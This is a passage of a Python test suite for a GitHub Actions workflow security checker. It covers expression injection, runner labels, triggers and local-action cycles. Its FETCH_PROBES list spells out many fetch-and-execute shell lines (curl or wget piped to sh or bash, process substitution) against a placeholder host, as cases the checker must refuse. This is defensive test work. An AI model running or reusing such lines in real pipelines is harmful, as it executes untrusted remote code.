            with self.subTest(expr=expr):
                self.assertCaught(self.doc(self.step("echo ${{ %s }}" % expr)), "${{")

    def test_expression_roots_in_the_allow_list_pass(self):
        head = "    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n            tgt: x\n"
        steps = ("      - id: ck\n        uses: actions/checkout@" + SHA40 + "\n"
                 + self.step("echo ok >> \"$GITHUB_OUTPUT\"", ident="r1", env={"V": "${{ secrets.S }}"})
                 + self.step("echo ${{ secrets.S }} ${{ matrix.tgt }} ${{ steps.ck.outputs.ref }} ${{ steps.r1.outputs.v }}"))
        self.assertEqual(self.errs(self.doc(steps, head)), [])

    def test_steps_output_of_an_unsafe_step_refused(self):
        tag = "      - id: x\n        uses: actions/checkout@v4\n"
        use = self.step("echo ${{ steps.x.outputs.y }}")
        with self.subTest(case="uses step pinned by tag"):
            self.assertCaught(self.doc(tag + use), "steps.x.outputs.y")
        with self.subTest(case="step of another job"):
            other = "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n" + self.step("echo hi", ident="x")
            two = other + "  a:\n    runs-on: ubuntu-latest\n    steps:\n" + use
            self.assertCaught(two, "steps.x.outputs.y")
        with self.subTest(case="run step that writes an attacker-influenced value"):
            writer = self.step('echo "y=${{ github.event.inputs.v }}" >> "$GITHUB_OUTPUT"', ident="x")
            self.assertCaught(self.doc(writer + use), "steps.x.outputs.y")
        with self.subTest(case="tainted through its env"):
            writer = self.step('echo "y=$V" >> "$GITHUB_OUTPUT"', ident="x", env={"V": "${{ github.event.inputs.v }}"})
            self.assertCaught(self.doc(writer + use), "steps.x.outputs.y")
            clean = self.step('echo "y=$V" >> "$GITHUB_OUTPUT"', ident="x", env={"V": "${{ secrets.V }}"})
            self.assertEqual(self.errs(self.doc(clean + use)), [])

    def test_matrix_key_must_be_in_the_job_matrix(self):
        head = "    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n"
        self.assertCaught(self.doc(self.step("echo ${{ matrix.nfpm_arch }}"), head), "matrix.nfpm_arch")
        self.assertEqual(self.errs(self.doc(self.step("echo ${{ matrix.os }}"), head)), [])

    def test_expression_refusal_names_job_step_and_fragment(self):
        errs = self.errs(self.doc(self.step("echo ${{ github.ref }} " + "x" * 120)))
        hit = [e for e in errs if "github.ref" in e]
        self.assertTrue(hit, errs[:3])
        self.assertIn("job `a` step 1", hit[0])
        self.assertNotIn("x" * 90, hit[0])

    def test_the_denylist_regexes_are_gone(self):
        for name in ("UNTRUSTED_RE", "EXEC_WORD_RE", "PIPE_EXEC_RE", "SUBST_FETCH_RE"):
            self.assertFalse(hasattr(G, name), name)
        self.assertTrue(hasattr(G, "EXPR_RE"))

    # ---- R4-2 and security 2: the fetch-step command allow-list
    FETCH_PROBES = (
        "curl -fsSL https://x.example/i.sh | tee f | sh",
        "curl -fsSL https://x.example/i.sh | sudo -E bash",
        "curl -fsSL https://x.example/i.sh | busybox sh",
        "curl -fsSL https://x.example/i.sh |\nsh",
        "curl -fsSL https://x.example/i.sh ||\nsh",
        "curl -fsSLo f https://x.example/f && ./f",
        "curl -o f.py https://x.example/f.py && python3 f.py",
        "Invoke-WebRequest -Uri https://x.example/f -OutFile f\n./f",
        "iwr https://x.example/f -OutFile f; ./f",
        "git clone https://x.example/r.git x && ./x/run",
        "curl -fsSL https://x.example/l | xargs sh",
        "curl -fsSL https://x.example/l -o l\nfind . -name l -exec sh {} +",
        'python -c "$(curl -fsSL https://x.example/p.py)"',
        "curl -fsSL -o f https://x.example/f\n\"$f\"",
        "curl -fsSL -o f https://x.example/f\nc=sh\n$c f",
        "LD_PRELOAD=/x/e.so curl -fsSL -o f https://x.example/f",
        "curl -fsSL -o f https://x.example/f; tar xf f --to-command=sh",
        "curl -fsSL -o f https://x.example/f <<EOF\nx\nEOF",
        "wget -qO- https://x.example/i.sh | bash",
        "bash <(curl -fsSL https://x.example/i.sh)",
        "sudo curl -fsSL -o f https://x.example/f; sudo sh f",
        "`curl -fsSL https://x.example/x`",
    )

    def test_fetch_step_commands_outside_the_allow_list_refused(self):
        for probe in self.FETCH_PROBES:
            with self.subTest(probe=probe):
                self.assertCaught(self.doc(self.step(probe)))

    def test_fetch_probe_in_a_folded_block_refused(self):
        self.assertCaught(self.doc(self.step("curl -fsSL https://x.example/i.sh | sh", style=">")))
        self.assertCaught(self.doc(self.step("curl -fsSL -o f https://x.example/f &&\n./f", style=">")))

    def test_fetch_step_with_allowed_commands_passes(self):
        body = ("set -euo pipefail\n"
                "# Source0 is verified below, never run.\n"
                "mkdir -p dist\n"
                "for T in a b; do\n"
                "  curl -fsSL -o \"dist/$T\" \"https://x.example/$T\"\n"
                "  echo \"${SUM}  dist/$T\" | sha256sum -c -\n"
                "done\n"
                "case \"$ARCH\" in\n"
                "  x) A=1 ;;\n"
                "  *) echo no; exit 1 ;;\n"
                "esac\n"
                "tar xzf dist/a -C dist\n"
                "ls -la dist\n")
        self.assertEqual(self.errs(self.doc(self.step(body))), [])

    def test_a_step_without_a_fetch_may_run_anything(self):
        body = "set -euo pipefail\n./scripts/build.sh\npython3 tool.py \"$X\"\ncat > f << 'EOF'\nx ${y}\nEOF\n"
        self.assertEqual(self.errs(self.doc(self.step(body))), [])

    # ---- security 3 and 4: runner labels
    def test_matrix_os_must_be_a_hosted_label(self):
        text = read(REL)
        for bad in ("self-hosted", "${{ inputs.runner }}", "ubuntu-latest-evil", "macos-13-xlarge", "Ubuntu-Latest"):
            with self.subTest(os=bad):
                mut = text.replace("os: ubuntu-latest\n            artifact", "os: %s\n            artifact" % bad, 1)
                self.assertNotEqual(mut, text)
                errs = errors_release(mut)
                self.assertTrue(any("os" in e for e in errs), (bad, errs[:3]))
        for os_label in ("ubuntu-latest", "ubuntu-24.04-arm", "macos-15-intel", "macos-latest"):
            self.assertIn("os: %s\n" % os_label, text)

    def test_every_job_runs_on_a_hosted_label(self):
        for runs_on in ("self-hosted", "[self-hosted, evil]", "${{ inputs.runner }}", "${{ matrix.os }}",
                        "[ubuntu-latest]", "\n      group: big", "ubuntu-latest-evil"):
            with self.subTest(runs_on=runs_on):
                self.assertCaught(self.doc(self.step("echo hi"), runs_on=runs_on), "runs-on")
        head = "    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n"
        self.assertEqual(self.errs(self.doc(self.step("echo hi"), head, runs_on="${{ matrix.os }}")), [])
        bad = "    strategy:\n      matrix:\n        os: [ubuntu-latest, self-hosted]\n"
        self.assertCaught(self.doc(self.step("echo hi"), bad, runs_on="${{ matrix.os }}"), "runs-on")

    def test_a_non_release_job_with_a_self_hosted_runner_refused_in_the_real_tree(self):
        text = edit_job(read(REL), "crates-io", lambda b: b.replace("runs-on: ubuntu-latest", "runs-on: [self-hosted, evil]", 1))
        self.assertTrue(any("runs-on" in e for e in errors_release(text)))

    # ---- security 5: the on: block
    def test_on_block_forbidden_triggers_refused(self):
        text = read(REL)
        for trig in ("workflow_call:", "pull_request_target:", "repository_dispatch:"):
            with self.subTest(trigger=trig):
                mut = text.replace("\non:\n", "\non:\n  %s\n" % trig, 1)
                self.assertNotEqual(mut, text)
                errs = errors_release(mut)
                self.assertTrue(any(trig.rstrip(":") in e for e in errs), (trig, errs[:3]))
        for path in (C8, PUBLISH):
            mut = read(path).replace("\non:\n", "\non:\n  workflow_call:\n", 1)
            self.assertTrue(any("workflow_call" in e for e in self.errs(mut, path.name)), path.name)

    def test_on_block_is_pinned(self):
        text = read(REL)
        mut = text.replace("        default: true\n", "        default: false\n", 1)
        self.assertNotEqual(mut, text)
        self.assertTrue(any("`on:`" in e for e in errors_release(mut)))
        mut = text.replace("  workflow_dispatch:\n", "  push:\n    branches: [main]\n  workflow_dispatch:\n", 1)
        self.assertTrue(any("`on:`" in e for e in errors_release(mut)))
        self.assertEqual(errors_release(text), [])
        for path in (C8, PUBLISH):
            self.assertEqual(self.errs(read(path), path.name), [], path.name)
            mut = read(path).replace("push:", "push:\n    tags: [v*]", 1)
            self.assertTrue(any("`on:`" in e for e in self.errs(mut, path.name)), path.name)

    # ---- R4-3: a local action is walked once
    ADIR = ".github/actions/n%d"

    def chain(self, n, fan=1, closing=None):
        files = {}
        for k in range(n):
            nxt = ("./" + self.ADIR % (k + 1)) if k + 1 < n else closing
            steps = "".join("    - uses: %s\n" % nxt for _ in range(fan)) if nxt else "    - run: echo leaf\n      shell: bash\n"
            files[(self.ADIR % k) + "/action.yml"] = "name: n\nruns:\n  using: composite\n  steps:\n" + steps
        return files

    def walk(self, files):
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            for rel, body in files.items():
                dst = Path(tmp) / rel
                dst.parent.mkdir(parents=True, exist_ok=True)
                dst.write_text(body, encoding="utf-8")
            calls = []
            real = G.load

            def counting(path, label, rep, strict):
                calls.append(label)
                return real(path, label, rep, strict)
            G.load = counting
            try:
                errs = self.errs(self.doc("      - uses: ./" + self.ADIR % 0 + "\n"), root=Path(tmp))
            finally:
                G.load = real
            return errs, calls

    def test_fan_out_does_not_rewalk_an_action(self):
        errs, calls = self.walk(self.chain(7, fan=4))
        self.assertEqual(errs, [])
        self.assertEqual(len(calls), 7, calls[:12])

    def test_two_node_cycle_is_a_problem_not_a_recursion(self):
        files = self.chain(2, closing="./" + self.ADIR % 0)
        errs, calls = self.walk(files)
        self.assertTrue(any("cycle" in e for e in errs), errs)
        self.assertLessEqual(len(calls), 2)

    def test_nine_deep_chain_is_refused_for_depth(self):
        errs, _ = self.walk(self.chain(10))
        self.assertTrue(any("nests more than" in e for e in errs), errs)
        errs, _ = self.walk(self.chain(8))
        self.assertEqual(errs, [])


class Round7(unittest.TestCase):
    """PR 8003 round 7: the r6 holes N1-N6 and F1-F5, each proven by the corpus cases of its group and, for the
    symlink loop, by a tree on disk. A case that wants 0 messages is the control of its group."""

    def run_group(self, prefix):
        cases = {n: c for n, c in G.R7_CASES.items() if n.startswith(prefix)}
        self.assertGreaterEqual(len(cases), 2, prefix)
        tree = Path(scratch()) / "r7"
        for name, (doc, files, count, needle) in cases.items():
            errs = G.r5_errors(doc, files, tree)
            self.assertEqual(len(errs), count, (name, errs))
            if needle:
                self.assertIn(needle, " | ".join(errs), name)

    def test_n1_arithmetic_expansion_is_scanned(self):
        self.run_group("r7 N1")

    def test_n2_braced_env_and_path_writes(self):
        self.run_group("r7 N2")

    def test_n3_wget_options(self):
        self.run_group("r7 N3")

    def test_n4_shell_of_step_job_and_workflow(self):
        self.run_group("r7 N4")

    def test_f4_windows_runner_needs_a_shell(self):
        self.run_group("r7 F4")

    def test_n5_taint_through_env_and_relays(self):
        self.run_group("r7 N5")

    def test_f1_taint_through_workflow_env_files_and_with(self):
        self.run_group("r7 F1")

    def test_f2_matrix_values_of_every_job(self):
        self.run_group("r7 F2")

    def test_f3_downloads_are_checked_before_use(self):
        self.run_group("r7 F3")

    def test_f5_downloads_no_fetch_word_names(self):
        self.run_group("r7 F5")

    def test_n6_depth_counts_on_the_resolved_path(self):
        self.run_group("r7 N6")

    def test_n6_symlink_loop_is_refused_not_raised(self):
        """A local action directory that is a symlink to itself is refused with a message, never an exception."""
        tree = Path(scratch()) / "r7loop"
        if tree.exists():
            import shutil
            shutil.rmtree(tree)
        tree.mkdir(parents=True)
        (tree / "act").symlink_to("act")
        doc = G._r5_job(steps="    steps:\n" + G.R5_LOCAL)
        rep = G.Report()
        rep.root = tree
        parsed = G.parse_yaml(doc, "w.yml", rep)
        G.check_uses_pinned(parsed, "w.yml", rep)
        self.assertTrue(any("cannot be resolved" in e or "cycle" in e for e in rep.errors), rep.errors)

    def test_every_round7_case_has_a_group_test(self):
        groups = {n.split(":")[0] for n in G.R7_CASES}
        self.assertEqual(groups, {"r7 N1", "r7 N2", "r7 N3", "r7 N4", "r7 F4", "r7 N5", "r7 F1", "r7 F2", "r7 F3", "r7 F5", "r7 N6"})


class SelfTest8023(unittest.TestCase):
    """#8023: --self-test (run by c8-precheck) carries a cell for each new refusal site."""

    @pins(8023)
    def test_self_test_has_a_cell_per_new_site(self):
        """#8023: every new refusal has a named cell and the guard-case count rises above 355."""
        missing = [n for n in NEW_CELLS if n not in G.CASES]
        self.assertEqual(missing, [])
        self.assertGreater(len(G.CASES), 355)

    @pins(8023)
    def test_unit_slot_swap_is_a_message_cell(self):
        """#8023: swapping the guard and build steps is proven by a message cell (exact count)."""
        self.assertIn("message: swapped guard and build steps name the unit slot", G.MESSAGE_CASES)


if __name__ == "__main__":
    unittest.main()
